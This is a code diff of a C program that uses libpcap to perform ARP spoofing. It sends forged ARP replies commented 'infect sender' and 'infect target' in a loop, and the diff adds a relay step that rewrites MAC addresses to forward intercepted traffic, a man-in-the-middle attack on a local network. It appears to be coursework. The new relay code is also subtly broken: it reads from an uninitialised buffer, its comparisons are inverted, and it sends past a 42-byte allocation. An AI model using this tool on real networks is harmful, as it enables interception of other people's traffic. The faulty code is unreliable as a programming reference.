@@ -7,7 +7,6 @@ int usage(){
 }
  int main(int argc, char* argv[])
 {
-     printf("start\n");
     if(argc!=4){
         usage();
         exit(1);
@@ -58,7 +57,6 @@ int usage(){
 
         int response=pcap_next_ex(handle, &header, &packet);
         if(response==0) continue;
-        printf("running\n");
         if (response == -1 || response == -2) break;
 
         Ethernet_Header * eth_check = (Ethernet_Header*)packet;
@@ -97,7 +95,6 @@ int usage(){
 
         int response=pcap_next_ex(handle, &header, &packet);
         if(response==0) continue;
-        printf("running\n");
         if (response == -1 || response == -2) break;
 
         Ethernet_Header * eth_check = (Ethernet_Header*)packet;
@@ -134,14 +131,57 @@ int usage(){
     Ethernet_Header * eth2 = (Ethernet_Header *)sendpacket2;
     ARP_Header * arp2 = (ARP_Header *)(sendpacket2 + 14);
     default_setting(eth2, arp2);
-    Infection_Setting(eth, arp, attacker_MAC, sender_MAC, sender_IP, target_IP);
-    Infection_Setting(eth2, arp2, attacker_MAC, attacker_IP, target_IP, sender_IP);
+    Infection_Setting(eth, arp, attacker_MAC, sender_MAC, sender_IP, target_IP);//infect sender
+    Infection_Setting(eth2, arp2, attacker_MAC, attacker_IP, target_IP, sender_IP);//infect target
+
+    const u_char* response_packet;
+    char * response_packet_pointer = (char*)malloc(sizeof(char) * 42);
+    Ethernet_Header * eth_res = (Ethernet_Header *)response_packet_pointer;
+    ARP_Header * arp_res = (ARP_Header *)(response_packet_pointer + 14);
+    default_setting(eth2, arp2);
     while(1){
-        pcap_sendpacket(handle, (u_char*)sendpacket, 42);
-        pcap_sendpacket(handle, (u_char*)sendpacket2, 42);
-        sleep(2);
+        pcap_sendpacket(handle, (u_char*)sendpacket, 42);//infect sender
+        pcap_sendpacket(handle, (u_char*)sendpacket2, 42);//infect target
         printf("infecting sender, target....\n");
-    }
+
+        int response=pcap_next_ex(handle, &header, &response_packet);
+
+        //TODO
+        //IF ARP, infect source
+        //
+        //check if it's from sender or target
+        //change mac and relay (mac would be mine, so change to proper mac.)
+        if(response==0) {printf("response: 0\n");continue;}
+        else if (response == -1 || response == -2) break;
+        else printf("spoofing\n");
+        printf("relaying packet\n");
+
+        printf("%4x \n",eth_res->type);
+
+        if(eth_res->type==0x0806){
+            printf("ARP\nInfecting again\n");
+            pcap_sendpacket(handle, (u_char*)sendpacket, 42);//infect sender
+            pcap_sendpacket(handle, (u_char*)sendpacket2, 42);//infect target
+            continue;
+        }
+        else{
+            printf("Not ARP\n");
+            if(memcmp(eth_res->S_addr, target_MAC, 6)&& memcmp(arp_res->D_P_addr, sender_IP, 4)){
+                printf("From target\n");
+                memcpy(eth_res->D_addr, sender_MAC, 6);
+                memcpy(arp_res->D_H_addr, sender_MAC, 6);
+            }
+            else if(memcmp(eth_res->S_addr, sender_MAC, 6) && memcmp(arp_res->D_P_addr, target_IP, 4)){
+                printf("From sender\n");
+                memcpy(eth_res->D_addr, target_MAC, 6);
+                memcpy(arp_res->D_H_addr, target_MAC, 6);
+            }
+
+        }
+
+        pcap_sendpacket(handle,(u_char*)response_packet_pointer, 100);
+        sleep(2000);
+     }
     //infect target mac tagble.
 
     //receive packet from sender
